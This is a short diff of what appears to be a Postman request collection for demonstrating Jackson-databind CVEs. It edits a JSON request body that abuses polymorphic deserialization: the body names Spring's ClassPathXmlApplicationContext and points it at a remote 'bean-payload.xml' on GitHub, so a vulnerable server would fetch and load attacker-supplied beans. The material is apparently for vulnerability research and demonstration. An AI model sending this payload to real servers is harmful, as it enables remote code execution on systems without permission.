@@ -78,7 +78,7 @@
 				],
 				"body": {
 					"mode": "raw",
-					"raw": "{\r\n\t\"name\": \"X\",\r\n\t\"metadata\": {\r\n\t\t\"a\": [\r\n\t\t    \"org.springframework.context.support.ClassPathXmlApplicationContext\",\r\n\t\t    \"https://raw.githubusercontent.com/s3curitybug/jackson-databind-cves/master/bean-payload\"\r\n\t\t]\r\n\t}\r\n}",
+					"raw": "{\r\n\t\"name\": \"X\",\r\n\t\"metadata\": {\r\n\t\t\"a\": [\r\n\t\t    \"org.springframework.context.support.ClassPathXmlApplicationContext\",\r\n\t\t    \"https://raw.githubusercontent.com/s3curitybug/jackson-databind-cves/master/bean-payload.xml\"\r\n\t\t]\r\n\t}\r\n}",
 					"options": {
 						"raw": {
 							"language": "json"
